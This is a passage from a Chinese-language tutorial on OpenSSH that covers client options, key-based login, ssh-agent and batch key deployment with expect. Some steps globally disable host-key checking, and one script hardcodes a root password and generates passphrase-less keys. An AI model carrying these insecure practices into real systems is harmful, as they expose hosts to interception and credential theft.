<pre class="example" id="org57174df">
services.ssh.server_host_key.fingerprint_sha256=3344ebb77ea0faece5b3bae2d7fb5424150bd61e02ae051160017ad44bd3767d
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0511cf72-d86c-46ff-8ffa-01844e986fde" class="outline-4">
<h4 id="h:0511cf72-d86c-46ff-8ffa-01844e986fde">ssh加密通讯原理</h4>
<div class="outline-text-4" id="text-h:0511cf72-d86c-46ff-8ffa-01844e986fde">

<figure id="orgd58f7cc">
<img src="images/image-20210120191544765.png" alt="image-20210120191544765.png" width="50%">

</figure>
</div>
</div>
</div>
<div id="outline-container-h:0ba58e6e-419d-4c69-894d-3e5fc7d199e0" class="outline-3">
<h3 id="h:0ba58e6e-419d-4c69-894d-3e5fc7d199e0">openssh软件包</h3>
<div class="outline-text-3" id="text-h:0ba58e6e-419d-4c69-894d-3e5fc7d199e0">
<p>
OpenSSH是SSH （Secure SHell）协议的免费开源实现，一般在各种Linux版本中
会默认安装，基于C/S结构
</p>

<p>
Openssh软件相关包：
</p>

<ul class="org-ul">
<li>openssh 通用包</li>
<li>openssh-clients</li>
<li>openssh-server</li>
</ul>

<p>
范例：相关包
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#rpm -qa openssh*
openssh-7.8p1-4.el8.x86_64
openssh-server-7.8p1-4.el8.x86_64
openssh-clients-7.8p1-4.el8.x86_64

[root@centos8 ~]#rpm -ql openssh-server
/etc/pam.d/sshd
/etc/ssh/sshd_config
/etc/sysconfig/sshd
/usr/lib/systemd/system/sshd-keygen.target
/usr/lib/systemd/system/sshd-keygen@.service
/usr/lib/systemd/system/sshd.service
/usr/lib/systemd/system/sshd.socket
/usr/lib/systemd/system/sshd@.service
/usr/lib/tmpfiles.d/openssh.conf
/usr/libexec/openssh/sshd-keygen
/usr/sbin/sshd


[root@centos8 ~]#rpm -ql openssh-clients
/etc/ssh/ssh_config
/etc/ssh/ssh_config.d
/etc/ssh/ssh_config.d/05-redhat.conf
/usr/bin/scp
/usr/bin/sftp
/usr/bin/ssh
/usr/bin/ssh-add
/usr/bin/ssh-agent
/usr/bin/ssh-copy-id
/usr/bin/ssh-keyscan

[root@centos8 ~]#rpm -ql openssh
/etc/ssh
/etc/ssh/moduli
/usr/bin/ssh-keygen
/usr/libexec/openssh
/usr/libexec/openssh/ssh-keysign
</pre>
</div>

<p>
服务器：/usr/sbin/sshd
</p>

<p>
Unit 文件：/usr/lib/systemd/system/sshd.service
</p>

<p>
客户端：
</p>

<ul class="org-ul">
<li>Linux Client: ssh, scp, sftp，slogin</li>
<li>Windows Client：xshell, MobaXterm,putty, securecrt,
sshsecureshellclient</li>
</ul>
</div>
</div>
<div id="outline-container-h:08f9ad34-b697-4810-b73c-8dfd56bbc54f" class="outline-3">
<h3 id="h:08f9ad34-b697-4810-b73c-8dfd56bbc54f">ssh客户端命令</h3>
<div class="outline-text-3" id="text-h:08f9ad34-b697-4810-b73c-8dfd56bbc54f">
<p>
官方文档：<a href="https://man.openbsd.org/ssh">https://man.openbsd.org/ssh</a>
</p>

<p>
ssh命令是ssh客户端，允许实现对远程系统经验证地加密安全访问
</p>

<p>
当用户远程连接ssh服务器时，会复制ssh服务器 <code>/etc/ssh/ssh_host*key.pub</code>
文件中的公钥到客户机d的 <code>~./ssh/know_hosts</code> 中。下次连接时，会自动匹配
相应私钥，不能匹配，将拒绝连接
</p>

<p>
<b>ssh客户端配置文件</b> ：/etc/ssh/ssh_config
</p>

<p>
<b>主要配置</b>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">StrictHostKeyChecking ask</span>
&#39318;&#27425;&#30331;&#24405;&#19981;&#26174;&#31034;&#26816;&#26597;&#25552;&#31034;
StrictHostKeyChecking no

<span style="color: #b22222;"># </span><span style="color: #b22222;">IdentityFile ~/.ssh/id_rsa</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">IdentityFile ~/.ssh/id_dsa</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">IdentityFile ~/.ssh/id_ecdsa</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">IdentityFile ~/.ssh/id_ed25519</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">Port 22</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25351;&#23450;&#23458;&#25143;&#31471;&#35775;&#38382;&#31471;&#21475;</span>
cat &lt;&lt;\EOF &gt;&gt; ~/.ssh/config
<span style="color: #ffa54f;">host git.cn</span>
<span style="color: #ffa54f;">hostname git.cn</span>
<span style="color: #ffa54f;">port 11822</span>
<span style="color: #ffa54f;">EOF</span>
</pre>
</div>

<p>
范例：禁止首次连接的询问过程
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos7 ~]#sed -i.bak <span style="color: #8b2252;">'/StrictHostKeyChecking/s/.*/StrictHostKeyChecking no/'</span> /etc/ssh/ssh_config
</pre>
</div>

<p>
<b>格式：</b>
</p>

<pre class="example" id="org83f44e9">
ssh [user@]host [COMMAND]
ssh [-l user] host [COMMAND]
</pre>

<p>
常见选项
</p>

<pre class="example" id="orgc547c0e">
-p port：远程服务器监听的端口
-b 指定连接的源IP
-v 调试模式，"-vvv"可更详细
-C 压缩方式
-X 支持x11转发
-t：强制伪tty分配，如：ssh -t remoteserver1 ssh -t remoteserver2 ssh remoteserver3
-o option 指定ssh客户端配置 
   StrictHostKeyChecking=no 禁止首次连接的询问
   PreferredAuthentications=publickey 强制使用公钥验证

-i &lt;file&gt; 指定私钥文件路径，实现基于key验证，默认使用文件： ~/.ssh/id_dsa,~/.ssh/id_ecdsa, ~/.ssh/id_ed25519，~/.ssh/id_rsa等

其它选项
-1：强制使用ssh协议版本1；
-2：强制使用ssh协议版本2；
-4：强制使用IPv4地址；
-6：强制使用IPv6地址；
-A：开启认证代理连接转发功能；
-a：关闭认证代理连接转发功能；
-T: 禁用tty分配(pseudo-terminal allocation)
-F：指定ssh指令的配置文件；
-f：后台执行ssh指令；
-g：允许远程主机连接主机的转发端口；
-i：指定身份文件；
-l user: 以指定的用户登录远程主机；
-N：不执行远程指令；
-n: 重定向stdin为/dev/null，用于配合-f后台任务。能解决 while 循环中使用ssh问题
-L参数会在本地监听一个端口，转发数据到远程主机上
-q：静默模式；
-x：关闭X11转发功能；
-y：开启信任X11转发功能
-Y：支持信任的X11转发；

#ssh执行为后台任务: ssh -qTfNn用于建立纯端口转发用途的ssh连接
-q: quiet模式，忽视大部分的警告和诊断信息（比如端口转发时的各种连接错误）
-T: 禁用tty分配(pseudo-terminal allocation)
-f: 登录成功后即转为后台任务执行
-N: 不执行远程命令（专门做端口转发）
-n: 重定向stdin为/dev/null，用于配合-f后台任务
</pre>

<p>
范例: -t强制伪tty分配 . 从centos8连接到cento6，中间经过多台服务器跳转
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#ssh -t 10.0.0.8 ssh -t 10.0.0.77 ssh 10.0.0.6
root@10.0.0.8<span style="color: #8b2252;">'s password: </span>
<span style="color: #8b2252;">root@10.0.0.77'</span>s password: 
root@10.0.0.6<span style="color: #8b2252;">'s password: </span>
<span style="color: #8b2252;">Last login: Thu May 21 22:17:57 2020 from 10.0.0.77</span>
<span style="color: #8b2252;">[root@centos6 ~]#</span>
</pre>
</div>

<p>
本地打包远程传送并解压
</p>

<div class="org-src-container">
<pre class="src src-sh">tar -cf - *|ssh -t cc@172.21.39.98 <span style="color: #8b2252;">"cd /opt/project/client/cst-wallet-sdk/staging$pdate; tar -xf -"</span>
</pre>
</div>

<p>
范例：远程执行命令，ssh客户端禁止首次连接的询问过程
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos6 ~]#ssh 10.0.0.8 <span style="color: #8b2252;">"sed -i.bak '/StrictHostKeyChecking/s/.*/StrictHostKeyChecking no/' /etc/ssh/ssh_config"</span>
root@10.0.0.8<span style="color: #8b2252;">'s password: </span>
<span style="color: #8b2252;">[root@centos6 ~]#</span>
</pre>
</div>

<p>
<b>范例：在远程主机运行本地shell脚本(很实用)</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#hostname -I
10.0.0.88 192.168.122.1 
[root@centos8 ~]#cat test.sh 
<span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/bash</span>
hostname -I
[root@centos8 ~]#ssh 10.0.0.8 /bin/bash &lt; test.sh 
root@10.0.0.8<span style="color: #8b2252;">'s password: </span>
<span style="color: #8b2252;">10.0.0.8 192.168.122.1 </span>
</pre>
</div>

<p>
范例：lastb 远程登录失败的记录
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#lastb -f btmp-test | awk <span style="color: #8b2252;">'{print $3}'</span>|sort |uniq -c|sort -nr|head
86294 58.218.92.37
43148 58.218.92.26
18036 112.85.42.201
10501 111.26.195.101
10501 111.231.235.49
10501 111.204.186.207
10501 111.11.29.199
10499 118.26.23.225
 6288 42.7.26.142
 4236 58.218.92.30
[root@centos8 ~]#lastb -f btmp-test | awk <span style="color: #8b2252;">'{ip[$3]++}END{for(i in ip){print ip[i],i}}'</span>|sort -nr|head
86294 58.218.92.37
43148 58.218.92.26
18036 112.85.42.201
10501 111.26.195.101
10501 111.231.235.49
10501 111.204.186.207
10501 111.11.29.199
10499 118.26.23.225
 6288 42.7.26.142
 4236 58.218.92.30
</pre>
</div>

<p>
范例：通过SSH将MySQL数据库复制到新服务器
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">1. &#36890;&#36807;SSH&#23558;MySQL&#25968;&#25454;&#24211;&#22797;&#21046;&#21040;&#26032;&#26381;&#21153;&#22120;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36890;&#36807;&#21387;&#32553;&#30340;SSH&#38567;&#36947;Dump&#19968;&#20010;MySQL&#25968;&#25454;&#24211;&#65292;&#23558;&#20854;&#20316;&#20026;&#36755;&#20837;&#20256;&#36882;&#32473;mysql&#21629;&#20196;&#65292;&#25105;&#35748;&#20026;&#36825;&#26159;&#36801;&#31227;&#25968;&#25454;&#24211;&#21040;&#26032;&#26381;&#21153;&#22120;&#26368;&#24555;&#26368;&#22909;&#30340;&#26041;&#27861;&#12290;</span>
mysqldump &#8211;add-drop-table &#8211;extended-insert <span style="color: #8b2252;">\</span>
&#8211;force &#8211;log-error=error.log <span style="color: #8b2252;">\</span>
-uUSER -pPASS OLD_DB_NAME <span style="color: #8b2252;">\</span>
| ssh -C user@newhost <span style="color: #8b2252;">"mysql -uUSER -pPASS NEW_DB_NAME"</span>


<span style="color: #b22222;"># </span><span style="color: #b22222;">2. &#23454;&#26102;SSH&#32593;&#32476;&#21534;&#21520;&#37327;&#27979;&#35797;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36890;&#36807;SSH&#36830;&#25509;&#21040;&#20027;&#26426;&#65292;&#26174;&#31034;&#23454;&#26102;&#30340;&#20256;&#36755;&#36895;&#24230;&#65292;&#23558;&#25152;&#26377;&#20256;&#36755;&#25968;&#25454;&#25351;&#21521;/dev/null&#65292;&#38656;&#35201;&#20808;&#23433;&#35013;pv</span>
yes | pv | ssh &#20027;&#26426; <span style="color: #8b2252;">"cat &gt; /dev/null"</span>
0:00:18 [ 103MiB/s]
</pre>
</div>
</div>
<div id="outline-container-h:6dec53d1-f831-41bc-9a1d-b8aa04ea4f10" class="outline-4">
<h4 id="h:6dec53d1-f831-41bc-9a1d-b8aa04ea4f10">ssh登录验证方式介绍</h4>
<div class="outline-text-4" id="text-h:6dec53d1-f831-41bc-9a1d-b8aa04ea4f10">
<p>
ssh服务登录的验证方式
</p>

<ul class="org-ul">
<li>用户/口令</li>
<li>基于密钥</li>
</ul>

<p>
<b>基于用户和口令登录验证</b>
</p>


<figure id="orgf7a3f7f">
<img src="images/image-20210120191707930.png" alt="image-20210120191707930.png" width="50%">

</figure>

<ol class="org-ol">
<li>客户端发起ssh请求，服务器会把自己的公钥发送给用户</li>
<li>用户会根据服务器发来的公钥对密码进行加密</li>
<li>加密后的信息回传给服务器，服务器用自己的私钥解密，如果密码正确，则用户登录成功</li>
</ol>

<p>
<b>基于密钥的登录方式</b> (生产环境经常用到)
</p>


<figure id="org6936130">
<img src="images/image-20210120191725505.png" alt="image-20210120191725505.png" width="50%">

</figure>

<ol class="org-ol">
<li>首先在客户端生成一对密钥（ <code>ssh-keygen</code> ）</li>
<li>并将客户端的公钥 <code>ssh-copy-id</code> 拷贝到服务端 <code>~/.ssh</code> 目录</li>
<li>当客户端再次发送一个连接请求，包括ip、用户名 。 如 <code>ssh root@10.0.x.x</code></li>
<li>服务端得到客户端的请求后，会到 <code>authorized_keys</code> 中查找，如果有响应
的IP和用户，就会随机生成一 个字符串，例如：msg</li>
<li>服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端</li>
<li>得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端</li>
<li>服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录</li>
</ol>
</div>
</div>
<div id="outline-container-h:14fc5b89-6475-46f7-84d7-6ad0b98d8fde" class="outline-4">
<h4 id="h:14fc5b89-6475-46f7-84d7-6ad0b98d8fde">实现基于密钥的登录方式</h4>
<div class="outline-text-4" id="text-h:14fc5b89-6475-46f7-84d7-6ad0b98d8fde">
<p>
第1步：在客户端生成密钥对
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh-keygen -t rsa [-P <span style="color: #8b2252;">'password'</span>] [-f &#8220;~/.ssh/id_rsa<span style="color: #8b2252;">"]</span>
<span style="color: #8b2252;">#&#21487;&#20197;&#30452;&#25509;&#25191;&#34892;ssh-keygen &#65292;&#21518;&#38754;&#30340;&#19968;&#20018;&#21487;&#20197;&#29983;&#25104;</span>
<span style="color: #8b2252;">#&#40664;&#35748;rsa&#21152;&#23494;&#65292;~/.shh&#26159;&#40664;&#35748;&#36335;&#24452;&#65292;&#23494;&#30721;&#35270;&#24773;&#20917;&#32780;&#23450;</span>

<span style="color: #8b2252;">&#36873;&#39033;</span>
<span style="color: #8b2252;">-t  {rsa|ecdsa|dsa}&#65306;&#20844;&#38053;&#21152;&#23494;&#31639;&#27861;&#31867;&#22411;&#65307;</span>
<span style="color: #8b2252;">-b bits&#65306;&#25351;&#26126;&#23494;&#38053;&#38271;&#24230;&#65307;</span>
<span style="color: #8b2252;">-P passphrase&#65306;&#31169;&#38053;&#21152;&#23494;&#23494;&#30721;&#65307; -P '' &#35774;&#32622;&#31354;&#23494;&#30721;</span>
<span style="color: #8b2252;">-f output_keyfile&#65306;&#29983;&#25104;&#23494;&#38053;&#30340;&#20445;&#23384;&#20301;&#32622;&#65307;</span>
<span style="color: #8b2252;">-C &#27880;&#37322;</span>

<span style="color: #8b2252;">&#27880;&#24847;&#20107;&#39033;</span>
<span style="color: #8b2252;">.ssh&#30446;&#24405;&#30340;&#23646;&#20027;&#12289;&#23646;&#32452;&#20351;&#29992;&#24403;&#21069;&#29992;&#25143;&#19982;&#29992;&#25143;&#32452;</span>
<span style="color: #8b2252;">.ssh&#30446;&#24405;&#30340;&#26435;&#38480;&#35831;&#20445;&#25345;700</span>
<span style="color: #8b2252;">authorized_keys&#30340;&#26435;&#38480;&#20026;644</span>
<span style="color: #8b2252;">id_rsa&#30340;&#26435;&#38480;&#20026;600</span>
<span style="color: #8b2252;">id_rsa.pub&#30340;&#26435;&#38480;&#20026;644</span>
<span style="color: #8b2252;">&#26816;&#26597;&#29992;&#25143;$HOME&#30446;&#24405;&#26435;&#38480;&#24517;&#39035;&#20026;755</span>
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">su - xcw -c <span style="color: #8b2252;">"ssh-keygen -t rsa -P '' -f /home/xcw/.ssh/id_rsa"</span>
</pre>
</div>

<p>
第2步：把公钥文件传输至远程服务器对应用户的家目录
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh-copy-id [-i [identity_file]]  [-p port]  [-o ssh_option]  [user@]host
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20869;&#37096;&#36923;&#36753;</span>
cat ~/.ssh/id_rsa.pub | ssh $<span style="color: #a0522d;">1</span> <span style="color: #8b2252;">"umask 077; test -d ~/.ssh || mkdir ~/.ssh ; cat &gt;&gt; ~/.ssh/authorized_keys || exit 1"</span>
</pre>
</div>

<p>
其它：
</p>

<p>
重设私钥口令：
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh-keygen &#8211;p
</pre>
</div>

<p>
验证代理（authentication agent）保密解密后的密钥，口令就只需要输入一次，
在GNOME中，代理被自动提供给root用户
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#21551;&#29992;&#20195;&#29702;</span>
ssh-agent bash
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#38053;&#21273;&#36890;&#36807;&#21629;&#20196;&#28155;&#21152;&#32473;&#20195;&#29702;</span>
ssh-add
</pre>
</div>

<p>
在SecureCRT或Xshell实现基于key验证
</p>

<p>
在SecureCRT工具&#x2014;&gt;创建公钥&#x2014;&gt;生成Identity.pub文件
</p>

<p>
转化为openssh兼容格式（适合SecureCRT，Xshell不需要转化格式），并复制到
需登录主机上相应文件authorized_keys中,注意权限必须为600，在需登录的ssh
主机上执行：
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh-keygen -i -f Identity.pub &gt;&gt; .ssh/authorized_keys
</pre>
</div>

<p>
范例： <b>实现基于 key 验证</b>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">1. &#29983;&#25104;&#20844;&#38053;&#31169;&#38053;&#23545;</span>
[root@centos8 ~]#ssh-keygen 
Generating public/private rsa key pair.
Enter file<span style="color: #a020f0;"> in</span> which to save the key (/root/.ssh/id_rsa):  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22238;&#36710;&#65292;&#25509;&#21463;&#40664;&#35748;&#20540;</span>
Enter passphrase (empty for no passphrase):   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22238;&#36710;&#65292;&#25509;&#21463;&#40664;&#35748;&#20540;&#65292;&#31354;&#23494;&#30721;</span>
Enter same passphrase again:   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22238;&#36710;&#65292;&#25509;&#21463;&#40664;&#35748;&#20540;</span>

[root@centos8 ~]#ll .ssh/
total 12
-rw------- 1 root root 2602 May 22 22:40 id_rsa
-rw-r--r-- 1 root root  566 May 22 22:40 id_rsa.pub
[root@centos8 ~]#cat .ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbzJCv07jz13pWXljBT5HdWQoK71Oa537kxQ5e4uRbvUGYHfOei5YKX2Ke7f9pm5OycPgYId6fjAphcl7FkqF03SNIrds8HfLA2BbyXLP76hh/XzyK1lAXlMQL964kCtEdllHxBM+Z6ymAsepDj4bYaQx5jyYW66e/sbjNbQlqtnevWd3W/9ifd9xC9RdU/xEFxiphCEBXNo9hS8zEFhqaXqHHJkWfTyb8O735GMC8yDXtUyAs+zNVDY7k7EDSGMD7t25R5DcBXI9rrCQICoIHU/UWAiXeHu8To2ryr7j0g4UeI8DvksTo3BSwLOTzYb8bM41s1ZiP4gwtlgsIP1F1fJKQi1xVmQsL+h44pN/QGvPUEOEk5CvCD1SRu3gOrkDNhA6Cwpq9HDGpF3KkbCuTXU0ZL4b4O6+6zD8jemI5pfBzrhp05t/X5ZX10BGrqNDb0r22jgwy8E8CGUEuSt0OkJQR07W0l1/m/ivRvIufb7C1B/ATKiaLd4ZLPXGlNJc= root@centos8
[root@centos8 ~]#cat .ssh/id_rsa

<span style="color: #b22222;"># </span><span style="color: #b22222;">2. &#25226;&#20844;&#38053;&#25991;&#20214;&#20256;&#36755;&#33267;&#36828;&#31243;&#26381;&#21153;&#22120;&#23545;&#24212;&#29992;&#25143;&#30340;&#23478;&#30446;&#24405;</span>
[root@centos8 ~]#ssh-copy-id root@10.0.0.77
root@10.0.0.77&#8217;s password:  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#36755;&#20837;&#36828;&#31243;&#29992;&#25143;&#30340;&#23494;&#30721;</span>


[root@Centos7 ~]#ll .ssh/
total 8
-rw------- 1 root root 566 May 22 22:42 authorized_keys
[root@Centos7 ~]#cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbzJCv07jz13pWXljBT5HdWQoK71Oa537kxQ5e4uRbvUGYHfOei5YKX2Ke7f9pm5OycPgYId6fjAphcl7FkqF03SNIrds8HfLA2BbyXLP76hh/XzyK1lAXlMQL964kCtEdllHxBM+Z6ymAsepDj4bYaQx5jyYW66e/sbjNbQlqtnevWd3W/9ifd9xC9RdU/xEFxiphCEBXNo9hS8zEFhqaXqHHJkWfTyb8O735GMC8yDXtUyAs+zNVDY7k7EDSGMD7t25R5DcBXI9rrCQICoIHU/UWAiXeHu8To2ryr7j0g4UeI8DvksTo3BSwLOTzYb8bM41s1ZiP4gwtlgsIP1F1fJKQi1xVmQsL+h44pN/QGvPUEOEk5CvCD1SRu3gOrkDNhA6Cwpq9HDGpF3KkbCuTXU0ZL4b4O6+6zD8jemI5pfBzrhp05t/X5ZX10BGrqNDb0r22jgwy8E8CGUEuSt0OkJQR07W0l1/m/ivRvIufb7C1B/ATKiaLd4ZLPXGlNJc= root@centos8

<span style="color: #b22222;"># </span><span style="color: #b22222;">3. &#27979;&#35797;</span>
[root@centos8 ~]#ssh 10.0.0.77
Last login: Fri May 22 18:45:18 2020 from 10.0.0.8
[root@Centos7 ~]#exit
<span style="color: #a020f0;">logout</span>
Connection to 10.0.0.77 closed.
[root@centos8 ~]#scp /etc/fstab 10.0.0.77:/data
fstab                                     100%  709   202.1KB/s   00:00   

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23545;&#31169;&#38053;&#21152;&#23494;</span>
[root@centos8 ~]#ssh-keygen -p
Enter file<span style="color: #a020f0;"> in</span> which the key is (/root/.ssh/id_rsa): 
Key has comment <span style="color: #8b2252;">'root@centos8'</span>
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.

[root@centos8 ~]#ssh 10.0.0.77
Enter passphrase for key <span style="color: #8b2252;">'/root/.ssh/id_rsa'</span>: <span style="color: #b22222;">#</span><span style="color: #b22222;">&#36755;&#20837;&#31169;&#38053;&#30340;&#23494;&#30721;</span>
Last login: Fri May 22 23:20:50 2020 from 10.0.0.8
[root@centos7 ~]#exit
<span style="color: #a020f0;">logout</span>
Connection to 10.0.0.77 closed.

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21551;&#29992;ssh&#20195;&#29702;&#65292;&#20020;&#26102;&#24615;&#30340;&#65292;exit&#21363;&#21487;&#36864;&#20986;</span>
[root@centos8 ~]#ssh-agent bash <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;&#24182;&#36827;&#20837;&#20195;&#29702;&#31243;&#24207;&#29615;&#22659;&#37324;</span>
[root@centos8 ~]#ps aux |grep agent
root       5931  0.0  0.0  29444   548 ?        Ss   23:48   0:00 ssh-agent bash
root       5958  0.0  0.0  12108   964 pts/0    S+   23:48   0:00 grep --color=auto agent

[root@centos8 ~]#ssh-add <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;&#23494;&#30721;&#25176;&#31649;&#32473;&#20195;&#29702;&#26381;&#21153;</span>
Identity added: /root/.ssh/id_rsa (root@centos8)
[root@centos8 ~]#ssh 10.0.0.77
Last login: Fri May 22 23:43:11 2020 from 10.0.0.8
</pre>
</div>

<p>
范例：基于key验证实现批量主机管理
</p>

<div class="org-src-container">
<pre class="src src-cpp">[<span style="color: #008b8b;">root</span>@centos8 ~]#cat hosts.txt
10.0.0.7
10.0.0.6
[root@centos8 ~]#<span style="color: #a020f0;">for</span> i in `cat hosts.txt`;<span style="color: #a020f0;">do</span> ssh $i hostname -I ;done
10.0.0.7
10.0.0.6
</pre>
</div>

<p>
范例：实现xshell的基于key验证
</p>


<figure id="org01b7e98">
<img src="images/image-20210120194553421.png" alt="image-20210120194553421.png" width="20%">

</figure>


<figure id="org404bb5f">
<img src="images/image-20210120194615981.png" alt="image-20210120194615981.png" width="20%">

</figure>


<figure id="orgd9afd2c">
<img src="images/image-20210120194645851.png" alt="image-20210120194645851.png" width="20%">

</figure>


<figure id="orga909603">
<img src="images/image-20210120194720098.png" alt="image-20210120194720098.png" width="20%">

</figure>


<figure id="org71a5d87">
<img src="images/image-20210120194731859.png" alt="image-20210120194731859.png" width="20%">

</figure>


<figure id="org2fac916">
<img src="images/image-20210120194747633.png" alt="image-20210120194747633.png" width="20%">

</figure>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#rz -E
rz waiting to receive.
[root@centos8 ~]#ls
 anaconda-ks.cfg  id_rsa_1024(xshell).pub
[root@centos8 ~]#cat id_rsa_1024(xshell).pub
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAw4zT+e9iFU691e+oRs32VMZppWm9EKK11HqogMqIQ8sQkun4lOCdE8nbsrSFTESV/x9yztRHwWTDU7366t0WfTC549MXxpu921+IZd5JzkOHuc8D+AxNPLRp/F4kZTE2wlwuRaawU2OFsKf9whLwFR52JqciTdueGgbzA2OB4Q8=
[root@centos8 ~]#mkdir .ssh ; chmod 700 .ssh
[root@centos8 ~]#cat id_rsa_1024(xshell).pub &gt; .ssh/authorized_keys
[root@centos8 ~]#chmod 600 .ssh/authorized_keys
[root@centos8 ~]#ll .ssh/authorized_keys
-rw------- 1 root root 208 May 23 00:03 .ssh/authorized_keys
</pre>
</div>

<p>
使用xshell连接
</p>


<figure id="org14ca281">
<img src="images/image-20210409153924877.png" alt="image-20210409153924877.png" width="20%">

</figure>


<figure id="org0cf7ea4">
<img src="images/image-20210409153949139.png" alt="image-20210409153949139.png" width="20%">

</figure>


<figure id="org65c2e3f">
<img src="images/image-20210409154023483.png" alt="image-20210409154023483.png" width="20%">

</figure>

<p>
范例：expect实现批量基于ssh的key部署
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cat push_ssh_key.sh
<span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/bash</span>
<span style="color: #a0522d;">PASS</span>=1433236299
rpm -q expect &amp;&gt; /dev/null || yum install -y expect &amp;&gt; /dev/null
ssh-keygen -t rsa -P <span style="color: #8b2252;">""</span> -f /root/.ssh/id_rsa &amp;&gt; /dev/null &amp;&amp; <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"ssh key is created"</span>
<span style="color: #a020f0;">while </span><span style="color: #483d8b;">read</span> IP ;<span style="color: #a020f0;">do</span>
expect &lt;&lt;EOF &amp;&gt; /dev/null   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25110;&#32773; expect &amp;&gt; /dev/null &lt;&lt;EO</span><span style="color: #b22222;">F</span>
<span style="color: #ffa54f;">set timeout 20</span>
<span style="color: #ffa54f;">spawn ssh-copy-id -i /root/.ssh/id_rsa.pub root@$IP</span>
<span style="color: #ffa54f;">expect {</span>
<span style="color: #ffa54f;">    "yes/no" { send "yes/no";exp_continue }</span>
<span style="color: #ffa54f;">    "password" { send "$PASS\n" }</span>
<span style="color: #ffa54f;">}</span>
<span style="color: #ffa54f;">expect eof</span>
<span style="color: #ffa54f;">EOF</span>
<span style="color: #ffa54f;">echo $IP is ready</span>
<span style="color: #ffa54f;">done &lt; hosts.txt</span>

<span style="color: #ffa54f;">[root@centos8 ~]#cat hosts.txt </span>
<span style="color: #ffa54f;">10.0.0.6</span>
<span style="color: #ffa54f;">10.0.0.77</span>
<span style="color: #ffa54f;">[root@centos8 ~]#bash push_ssh_key.sh </span>
<span style="color: #ffa54f;">ssh key is created</span>
<span style="color: #ffa54f;">10.0.0.6 is ready</span>
<span style="color: #ffa54f;">10.0.0.77 is ready</span>
<span style="color: #ffa54f;">[root@centos8 ~]#ssh 10.0.0.6</span>
<span style="color: #ffa54f;">Last login: Fri May 22 18:53:04 2020 from 10.0.0.1</span>
<span style="color: #ffa54f;">[root@centos6 ~]#exit</span>
<span style="color: #ffa54f;">logout</span>
<span style="color: #ffa54f;">Connection to 10.0.0.6 closed.</span>
<span style="color: #ffa54f;">[root@centos8 ~]#ssh 10.0.0.77</span>
<span style="color: #ffa54f;">Last login: Sat May 23 15:20:19 2020 from 10.0.0.1</span>
<span style="color: #ffa54f;">[root@Centos7 ~]#exit</span>
<span style="color: #ffa54f;">logout</span>
<span style="color: #ffa54f;">Connection to 10.0.0.77 closed.</span>
</pre>
</div>

<p>
范例：如何实现三个主机之间互相的key验证
</p>
</div>
<div id="outline-container-h:58629ba6-9895-4843-abd3-33aad15bb440" class="outline-5">
<h5 id="h:58629ba6-9895-4843-abd3-33aad15bb440">通过私钥生成公钥</h5>
<div class="outline-text-5" id="text-h:58629ba6-9895-4843-abd3-33aad15bb440">
<div class="org-src-container">
<pre class="src src-sh">chmod 600 id_rsa
ssh-keygen -y -f /path/to/private_key &gt; /path/to/public_key.pub
chmod 644 id_rsa.pub
</pre>
</div>
</div>
</div>
<div id="outline-container-h:788f740e-0dc2-4cde-9ec6-2270d9c8006d" class="outline-5">
<h5 id="h:788f740e-0dc2-4cde-9ec6-2270d9c8006d">私钥格式转换</h5>
<div class="outline-text-5" id="text-h:788f740e-0dc2-4cde-9ec6-2270d9c8006d">
<p>
参考：<a href="https://www.mayanpeng.cn/archives/132.html">https://www.mayanpeng.cn/archives/132.html</a>
</p>

<p>
<b>生成新的RSA-PEM格式公私密钥</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh-keygen -m PEM -t rsa -b 4096
